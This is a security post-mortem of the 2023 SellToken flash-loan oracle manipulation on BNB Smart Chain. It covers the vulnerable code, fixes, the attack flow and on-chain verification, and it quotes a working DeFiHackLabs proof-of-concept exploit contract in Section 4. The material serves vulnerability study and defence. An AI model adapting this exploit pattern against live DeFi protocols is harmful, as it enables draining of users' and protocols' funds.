# SellToken — Flawed Price Dependency Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-13 |
| **Protocol** | SellToken (SellToken Router v2) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$197,000 (~635 WBNB, BNB ~$310) |
| **Attacker EOA** | [0x1581...6ae6](https://bscscan.com/address/0x1581262Fd72776bA5DA2337C4C4E1B92C6e36ae6) |
| **Attack Contract** | [0x19Ed...599F](https://bscscan.com/address/0x19Ed7Cd5F1d2bD02713131344d6890454D7C599F) |
| **Attack Tx** | [0x7d04...d6a](https://bscscan.com/tx/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a) |
| **Attack Block** | 28,168,035 |
| **Vulnerable Contract** | [0x57Db...70D6](https://bscscan.com/address/0x57Db19127617B77c8abd9420b5a35502b59870D6) (SellToken Router) |
| **SELLC Token** | [0xa645...ADe4](https://bscscan.com/address/0xa645995e9801F2ca6e2361eDF4c2A138362BADe4) |
| **Root Cause** | `getAmountOut` (PancakeSwap spot price) used directly as token price — manipulable within a single transaction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/SellToken_exp.sol) |

---

## 1. Vulnerability Overview

The SellToken protocol is a short-position service operating on BSC, where users can open short positions on specific tokens and receive BNB profits when the price declines.

The core issue is that the **`getToken2Price`** function calls PancakeSwap's `getAmountsOut` (spot price) in real time to calculate prices. This price can be freely manipulated within the same transaction via large-scale swaps. The attacker exploited this property using a **2-pass flash loan** structure to execute the following two manipulations sequentially:

1. **Pass 1**: Call `setTokenPrice` while the SELLC price is artificially inflated to **store an inflated reference price**
2. **Pass 2**: Inflate the price again to enter a short position via `ShortStart`, then immediately dump large amounts of SELLC to **crash the price below the reference price** → collect profits via `withdraw`

As a result, the protocol treated this as a "normal price decline" and paid out BNB to the attacker, when in reality it was a manipulated price differential within the same transaction.

**Key vulnerability combination**:
- **V-01**: Flawed price oracle directly dependent on PancakeSwap spot price (`getAmountsOut`) (CWE-1025)
- **V-02**: Single-transaction AMM spot price manipulation via DODO flash loan (CWE-841)
- **V-03**: Missing access control on `setTokenPrice` — anyone can set the reference price at any time (CWE-284)

---

## 2. Vulnerable Code Analysis

### 2.1 Flawed Price Oracle — Direct Use of PancakeSwap Spot Price (Core Vulnerability)

**Vulnerable code**:
```solidity
// ❌ VULNERABLE: uses PancakeSwap getAmountsOut as real-time spot price
// this value can be freely manipulated within the same transaction via large swaps
function getToken2Price(address token, address bnbOrUsdt, uint bnb)
    view public returns (uint) {
    // WBNB pair: 2-hop path [WBNB → token]
    // USDT pair: 3-hop path [WBNB → USDT → token]
    address[] memory path = new address[](2);
    path[0] = bnbOrUsdt;  // WBNB or USDT
    path[1] = token;       // target token e.g. SELLC

    // ❌ CORE VULNERABILITY: returns PancakeSwap spot price as-is
    // if called immediately after a large swap, returns the manipulated price
    uint[] memory amounts = pancakeRouter.getAmountsOut(bnb, path);
    return amounts[amounts.length - 1];
}
```

**Fixed code**:
```solidity
// ✅ FIX: use Uniswap V3 TWAP or Chainlink oracle
// must use a time-weighted average price that cannot be manipulated within a single block
function getToken2Price(address token, address bnbOrUsdt, uint bnb)
    view public returns (uint) {
    // ✅ Option 1: use Chainlink feed (immune to external manipulation)
    // (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    // require(block.timestamp - updatedAt < 1 hours, "Stale price data");

    // ✅ Option 2: use TWAP (time-weighted average over at least 30 minutes)
    // uint32 twapInterval = 1800; // 30 minutes
    // return getTWAPPrice(token, bnbOrUsdt, twapInterval);

    // ✅ Option 3: validate deviation between spot price and TWAP price
    uint spotPrice = _getSpotPrice(token, bnbOrUsdt, bnb);
    uint twapPrice = _getTWAPPrice(token, bnbOrUsdt, bnb);
    // reject if deviation exceeds 5%
    require(
        spotPrice <= twapPrice * 105 / 100 &&
        spotPrice >= twapPrice * 95 / 100,
        "Price manipulation detected: spot/TWAP deviation exceeded"
    );
    return twapPrice;
}
```

**Problem**: `getAmountsOut` returns an instantaneous spot price derived from the current liquidity pool reserve ratio. By injecting hundreds of BNB via flash loan and swapping, this value can be inflated dozens of times over, and the manipulation is reversed atomically within the same transaction at no net cost.

---

### 2.2 Missing Access Control — Anyone Can Set the Reference Price

**Vulnerable code**:
```solidity
// ❌ VULNERABLE: callable by anyone — attacker can set reference price at any desired moment
// the higher the reference price, the larger the payout on withdraw
function setTokenPrice(address _token) public {
    address bnbOrUsdt = mkt.getPair(_token);
    require(bnbOrUsdt == _WBNB || bnbOrUsdt == _USDT);

    // ❌ stores manipulated spot price as reference price
    // attacker calls this function immediately after inflating price via flash loan
    tokenPrice[_msgSender()][_token] = getToken2Price(_token, bnbOrUsdt, 1 ether);

    // ❌ ShortStart allowed after 30 seconds — short enough to bypass within a single TX
    tokenPriceTime[_msgSender()][_token] = block.timestamp + 30;
}
```

**Fixed code**:
```solidity
// ✅ FIX: TWAP-based pricing + sufficient time delay
function setTokenPrice(address _token) public {
    address bnbOrUsdt = mkt.getPair(_token);
    require(bnbOrUsdt == _WBNB || bnbOrUsdt == _USDT);

    // ✅ store reference price using TWAP (manipulation-resistant)
    tokenPrice[_msgSender()][_token] = getTWAPPrice(_token, bnbOrUsdt, 1 ether);

    // ✅ significantly extended timelock: ShortStart only allowed after at least 10 minutes
    tokenPriceTime[_msgSender()][_token] = block.timestamp + 600; // 10 minutes
}
```

---

### 2.3 Short Position Entry — Insufficient Price Validation

**Vulnerable code**:
```solidity
// ❌ VULNERABLE: insufficient price validation in ShortStart
function ShortStart(address coin, address addr, uint terrace) payable public {
    address bnbOrUsdt = mkt.getPair(coin);
    require(terraces[terrace] != address(0) && tokenPrice[addr][coin] > 0);
    require(coin != address(0));
    require(bnbOrUsdt == _WBNB || bnbOrUsdt == _USDT);

    // ❌ getNewTokenPrice: checks whether current spot price deviates more than 5% from reference
    // but since the attacker already set the reference price to a manipulated value, this check is meaningless
    require(!getNewTokenPrice(addr, coin, bnbOrUsdt) && block.timestamp > tokenPriceTime[addr][coin]);

    uint bnb = msg.value;
    // position size cap: 10% of total token value
    uint tos = getToken2Price(coin, bnbOrUsdt, mkt.balanceOf(coin)) / 10;
    require(Short[addr][coin].bnb + bnb <= tos); // ❌ this cap is also based on manipulated price

    Short[addr][coin].bnb += bnb * 98 / 100;  // deduct 2% fee
    tokenPrice[addr][coin] = 0;                // reset reference price
    uint newTokenValue = getTokenPrice(coin, bnbOrUsdt, bnb * 98 / 100);
    Short[addr][coin].tokenPrice += newTokenValue; // ❌ position size calculated using manipulated price
    Short[addr][coin].time = block.timestamp;
    // ... fee distribution
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA: `0x1581...6ae6`
- Attack contract deployed: `0x19Ed...599F`
- Initial funds: 10 WBNB (confirmed in test setup)
- In the actual attack, only DODO flash loans were used (no initial capital required)

### 3.2 Execution Phase

**Step 1 — Pass 1: Reference Price Manipulation (data.length > 20)**

1. Receive flash loans from 3 DODO DPP pools: **1,902.24 WBNB total**
   - Pool1 (`0xFeAF...d681`): 418.51 WBNB
   - Pool2 (`0x6098...b476`): 519.33 WBNB
   - Pool3 (`0x8191...051d`): 964.40 WBNB
2. Swap ~99% of received WBNB for SELLC on PancakeSwap (**WBNB → SELLC**)
   - Actual swap input: ~400 WBNB
   - SELLC price spikes (reserve ratio shifts due to large buy)
3. **Call `setTokenPrice(SELLC)`** — stores inflated spot price as reference price (`tokenPrice`)
4. Reverse swap SELLC → WBNB to restore price
5. Repay DODO flash loan of 1,902.24 WBNB (plus small fee)
6. `vm.warp(block.timestamp + 100)` — simulates timestamp advancement (actual attack: block advancement)

**Step 2 — Pass 2: Short Position Entry and Profit Collection (data.length < 20)**

7. Receive another DODO DPP flash loan
8. Swap WBNB → SELLC in large volume to **spike price again**
9. **Call `ShortStart{value: BNB}(SELLC, address(this), 1)`**
   - Records current (artificially high) price as the short position's reference unit price
   - Deposits BNB
10. Sell entire SELLC holding on PancakeSwap (**SELLC → WBNB**) — price crashes
    - At this point, SELLC price has dropped significantly below the reference price
11. **Call `withdraw(SELLC)`** — collect BNB equal to the difference between current price and reference price
    - Protocol treats this as a "normal price decline" and pays out BNB
12. Repay DODO flash loan
13. Secure net profit

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                      Attacker Contract                           │
│              0x19Ed7Cd5F1d2bD02713131344d6890454D7C599F          │
└────────────────────────┬────────────────────────────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  [PASS 1] Receive DODO Flash Loan │
         │  Pool1: 418.51 WBNB              │
         │  Pool2: 519.33 WBNB              │
         │  Pool3: 964.40 WBNB              │
         │  Total: ~1,902 WBNB              │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  PancakeSwap Swap ①              │
         │  WBNB (~400) ──▶ SELLC           │
         │  SELLC price: normal → spike     │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  Call setTokenPrice(SELLC)        │
         │  ❌ stores manipulated spot price │
         │     as reference price            │
         │  tokenPrice[attacker][SELLC] = X  │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  PancakeSwap Reverse Swap        │
         │  SELLC ──▶ WBNB (price restored) │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  Repay DODO Flash Loan (~1,902 WBNB) │
         └───────────────┬─────────────────┘
                         │
                  [Block advance / warp]
                         │
         ┌───────────────▼─────────────────┐
         │  [PASS 2] Receive DODO Flash Loan again │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  PancakeSwap Swap ②              │
         │  WBNB ──▶ SELLC (price spikes again) │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  Call ShortStart{value: BNB}     │
         │  ① Record current peak price as  │
         │     short reference price        │
         │  ② Deposit BNB                   │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  PancakeSwap Reverse Swap ②      │
         │  All SELLC ──▶ WBNB              │
         │  SELLC price: spike → crash      │
         │  (far below reference price)     │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  Call withdraw(SELLC)            │
         │  ✓ current price < ref price     │
         │    → collect profit BNB          │
         │  Protocol: judges as "normal     │
         │    price decline"                │
         │  Attacker: BNB profit secured ✓  │
         └───────────────┬─────────────────┘
                         │
         ┌───────────────▼─────────────────┐
         │  Repay DODO Flash Loan (2nd)     │
         │  Net profit secured: ~$197,000   │
         └─────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$197,000 (635+ WBNB, BNB ~$310)
- **Protocol loss**: SellToken protocol liquidity drained
- **Single transaction**: Block 28,168,035 — `0x7d04...d6a`

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// PoC core logic excerpt — English comments added
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/SellToken_exp.sol

contract SellTokenExp is Test, IDODOCallee {
    // DODO DPP pools (flash loan sources)
    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    // SellToken router (vulnerable contract)
    ISellTokenRouter s_router = ISellTokenRouter(0x57Db19127617B77c8abd9420b5a35502b59870D6);
    // SELLC token
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    // PancakeSwap router (price manipulation vector)
    IPancakeRouter p_router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    function testExp() external {
        // [Pass 1] data.length > 20 → flash loan to manipulate reference price
        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes("a123456789012345678901234567890"));
        // advance 100 seconds (to satisfy tokenPriceTime condition)
        vm.warp(block.timestamp + 100);
        // [Pass 2] data.length < 20 → enter actual short position + collect profit
        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes("abc"));

        emit log_named_decimal_uint("WBNB net profit", wbnb.balanceOf(address(this)) - 10 ether, 18);
    }

    function DPPFlashLoanCall(
        address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data
    ) external {
        uint256 balance = wbnb.balanceOf(address(this));
        if (data.length > 20) {
            balance -= 10 ether; // exclude own capital (use flash loan only)
        }

        // use 99% for swap, remaining 1% for ShortStart BNB deposit
        uint256 swap_balance = balance * 99 / 100;
        uint256 short_balance = balance - swap_balance; // BNB for short position entry

        // convert WBNB → BNB (ShortStart accepts native BNB)
        wbnb.withdraw(short_balance);

        // ── [Step 1] Price spike: large WBNB → SELLC buy ──
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(SELLC);
        wbnb.approve(address(p_router), type(uint256).max);
        SELLC.approve(address(p_router), type(uint256).max);
        // swap WBNB → SELLC on PancakeSwap → SELLC price spikes
        p_router.swapExactTokensForTokens(swap_balance, 0, path, address(this), block.timestamp + 1000);

        // ── [Step 2] Store reference price or enter short ──
        if (data.length > 20) {
            // [Pass 1] store reference price while price is inflated
            // ❌ vulnerability: manipulated spot price is stored as reference price
            s_router.setTokenPrice(address(SELLC));
        } else {
            // [Pass 2] enter short position at inflated price (deposit BNB)
            s_router.ShortStart{value: address(this).balance}(address(SELLC), address(this), 1);
        }

        // ── [Step 3] Price crash: sell all SELLC → WBNB ──
        path[0] = address(SELLC);
        path[1] = address(wbnb);
        // reverse swap using fee-on-transfer supporting function → SELLC price crashes
        p_router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );

        // ── [Step 4] Collect profit or repay ──
        if (data.length < 20) {
            // [Pass 2] call withdraw after price crash → protocol pays out BNB
            // ❌ vulnerability: difference between reference price (manipulated) vs current price (crashed) paid as profit
            s_router.withdraw(address(SELLC));
            wbnb.deposit{value: address(this).balance}();
            wbnb.transfer(address(oracle1), balance); // repay flash loan
        } else {
            // [Pass 1] repay
            wbnb.deposit{value: address(this).balance}();
            wbnb.transfer(address(oracle1), balance);
        }
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Price oracle directly dependent on AMM spot price | CRITICAL | CWE-1025 |
| V-02 | Single-transaction price manipulation via flash loan | CRITICAL | CWE-841 |
| V-03 | Missing access control on `setTokenPrice` | HIGH | CWE-284 |

### V-01: Price Oracle Directly Dependent on AMM Spot Price

- **Description**: The `getToken2Price` function calls PancakeSwap's `getAmountsOut` to return the current spot price. This value is derived from the liquidity pool's reserve ratio and can be instantly manipulated within the same block via large-scale swaps.
- **Impact**: Attacker can inject an arbitrary price of their choosing into the reference price and position calculations, enabling BNB theft from the protocol without any real price movement.
- **Attack conditions**: Existence of a flash loan source with sufficient liquidity (e.g., DODO); lower liquidity in the SELLC/WBNB pool reduces the cost of price manipulation.

### V-02: Single-Transaction Price Manipulation via Flash Loan

- **Description**: Borrows hundreds of WBNB uncollateralized from DODO DPP pools, manipulates the AMM price within the same transaction, exploits the protocol, and repays. All of this executes atomically within a single transaction, exposing every mechanism that relies on a spot price oracle.
- **Impact**: Large-scale price manipulation with zero initial capital. The only real costs are gas fees and flash loan fees.
- **Attack conditions**: Devastating when combined with V-01. In isolation, only enables price manipulation; actual harm requires a vulnerable oracle.

### V-03: Missing Access Control on `setTokenPrice`

- **Description**: The `setTokenPrice` function has no access control such as `onlyOwner` or a whitelist, allowing anyone to call it at any time and set their own reference price. By design intent, users setting their own reference prices means the access control issue is secondary to the price oracle dependency as the root cause, but when combined with flash loans, arbitrary malicious reference price injection becomes possible.
- **Impact**: Attacker can set the reference price at any desired moment (immediately after inflating the price with a flash loan), forming a complete attack path when combined with V-01 and V-02.
- **Attack conditions**: An essential component when exploited in combination with V-01 and V-02.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Replace with Chainlink oracle
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract SellTokenRouter {
    // Chainlink BNB/USD feed deployed on BSC
    AggregatorV3Interface internal priceFeed;

    // ✅ price query based on manipulation-resistant external oracle
    function getToken2Price(address token, address bnbOrUsdt, uint bnb)
        view public returns (uint) {
        (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
        // reject data older than 1 hour (defends against oracle failure)
        require(block.timestamp - updatedAt < 3600, "Price data expired");
        require(price > 0, "Invalid price");
        return uint256(price);
    }
}
```

```solidity
// ✅ Fix 2: TWAP-based pricing + sufficient timelock
function setTokenPrice(address _token) public {
    address bnbOrUsdt = mkt.getPair(_token);
    require(bnbOrUsdt == _WBNB || bnbOrUsdt == _USDT);

    // ✅ use minimum 30-minute TWAP — cannot be manipulated by flash loan
    tokenPrice[_msgSender()][_token] = getTWAPPrice(_token, bnbOrUsdt, 1 ether);

    // ✅ significantly extended timelock: 10 minutes (30 seconds → 600 seconds)
    // 30 seconds allows ShortStart in the same or immediately following block
    tokenPriceTime[_msgSender()][_token] = block.timestamp + 600;
}
```

```solidity
// ✅ Fix 3: Add spot/TWAP deviation check in ShortStart
function ShortStart(address coin, address addr, uint terrace) payable public {
    // ... existing checks ...

    // ✅ Added: reject if current spot price deviates more than 3% from TWAP
    uint spotPrice = getSpotPrice(coin, bnbOrUsdt);
    uint twapPrice = getTWAPPrice(coin, bnbOrUsdt, 1 ether);
    require(
        spotPrice <= twapPrice * 103 / 100 &&
        spotPrice >= twapPrice * 97 / 100,
        "Suspected price manipulation: spot/TWAP deviation exceeded"
    );

    // ... remaining logic ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: AMM spot price dependency | Replace with Chainlink oracle or minimum 30-minute TWAP |
| V-02: Flash loan price manipulation | Using TWAP prevents single-transaction manipulation (root fix) |
| V-03: Reference price timing manipulation | setTokenPrice timelock ≥ 600 seconds + apply TWAP |
| General: No price manipulation detection | Add spot vs TWAP deviation threshold validation logic |
| General: Single-transaction attacks | Prohibit combining setTokenPrice + ShortStart within the same block |

---

## 7. Lessons Learned

1. **On-chain spot prices cannot be used as oracles**: Instantaneous price functions from AMMs such as `getAmountsOut`, `getReserves`, and `slot0` can be freely manipulated within the same transaction with a single flash loan. **All price references used for financial decisions** — collateral valuation, liquidation thresholds, short/long position reference prices — **must use TWAP or external oracles (e.g., Chainlink)**.

2. **Short timelocks are meaningless**: The original 30-second timelock amounts to only ~10 blocks at ~3 seconds per block. Just as the attacker satisfied the condition with `vm.warp(+100 seconds)`, in practice the attack is viable after waiting a small number of blocks. **A timelock is only meaningful if it is at least as long as the TWAP window (minimum 30 minutes)**.

3. **Compound vulnerabilities are far more dangerous than individual ones**: V-01 (spot price dependency), V-02 (flash loan), and V-03 (weak timelock) are each limited in isolation, but the three combined produced a complete zero-capital attack path. Security audits must examine **not just individual functions, but also cross-function interactions and composability**.

4. **Use `swapExactTokensForTokensSupportingFeeOnTransferTokens` with caution**: The attacker's use of this function for the SELLC → WBNB reverse swap suggests SELLC is a fee-on-transfer token. Fee tokens deliver less than expected, causing standard `swapExactTokensForTokens` to revert. Protocol design must include **separate safeguards for fee-on-transfer token integrations**.

5. **Flash loans are amplifiers of design flaws, not attack tools themselves**: Flash loans are a legitimate DeFi primitive. In this attack, flash loans merely enabled the already-existing spot price dependency vulnerability to be **exploited at scale with no cost**. Blocking flash loans while leaving the root vulnerability intact still leaves the protocol exploitable by any attacker with sufficient capital.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Attack TX | `0x7d04...d6a` | `0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a` | ✅ |
| Attack block | 28,168,034 (fork) | 28,168,035 | ✅ |
| Attacker EOA | PoC: `address(this)` | `0x1581262Fd72776bA5DA2337C4C4E1B92C6e36ae6` | ✅ |
| Attack contract | PoC: `address(this)` | `0x19Ed7Cd5F1d2bD02713131344d6890454D7C599F` | ✅ |
| DODO Pool1 flash loan | ~418 WBNB | 418.51 WBNB | ✅ |
| DODO Pool2 flash loan | ~519 WBNB | 519.33 WBNB | ✅ |
| DODO Pool3 flash loan | ~964 WBNB | 964.40 WBNB | ✅ |
| Total flash loan | ~1,902 WBNB | 1,902.24 WBNB | ✅ |
| WBNB → SELLC swap input | ~swap_balance | 400.00 WBNB | ✅ |
| SELLC → WBNB proceeds | ~408 WBNB | 408.56 WBNB | ✅ |
| Additional profit (withdraw) | ~13 WBNB | 12.97 WBNB | ✅ |
| Total loss | $197,000 | ~$197,000 (635+ WBNB) | ✅ |

### 8.2 On-Chain Event Log Sequence (Attack TX — Block 28,168,035)

| # | Event | Token | From | To | Amount |
|------|--------|------|------|----|------|
| #00 | Transfer (WBNB) | WBNB | DODO Pool1 | Attack Contract | 418.51 |
| #01 | Transfer (WBNB) | WBNB | DODO Pool2 | Attack Contract | 519.33 |
| #02 | Transfer (WBNB) | WBNB | DODO Pool3 | Attack Contract | 964.40 |
| #03 | Approval | WBNB | Attack Contract | PancakeSwap | — |
| #04 | Transfer | WBNB | Attack Contract | SELLC/WBNB Pair | 400.00 |
| #05 | Transfer | SELLC | Pair | Attack Contract | 4,975,497 SELLC |
| #06 | Sync | — | Pair | — | — |
| #07 | Swap | — | PancakeSwap | — | — |
| #08 | Withdrawal | WBNB | — | — | (WBNB→BNB) |
| #09 | Deposit | WBNB | — | — | (BNB→WBNB) |
| #10 | Transfer | WBNB | PancakeSwap | Pair | 12.97 |
| #15 | Transfer | SELLC | Attack Contract | Pair | 4,975,497 SELLC |
| #16 | Transfer | WBNB | Pair | Attack Contract | 408.56 |
| #26 | Transfer | WBNB | Attack Contract | DODO Pool3 | 964.40 |
| #28 | Transfer | WBNB | Attack Contract | DODO Pool2 | 519.33 |
| #30 | Transfer | WBNB | Attack Contract | DODO Pool1 | 418.51 |

> **Note**: The actual TX generated 33 events in a single transaction. The PoC's 2-pass structure is consolidated into one TX.

### 8.3 Precondition Verification

| Item | Block 28,168,034 (pre-attack) |
|------|--------------------------|
| Attack contract WBNB balance | 0.785 WBNB (initial capital) |
| Attack contract balance after block | 0 (all used to repay flash loans) |
| SELLC price (normal) | ~0.00004135 BNB/SELLC |
| DODO Pool1 WBNB balance | 418.51 WBNB |
| Attack block number | 28,168,035 |
| Attack gas used | 9,023,064 gas |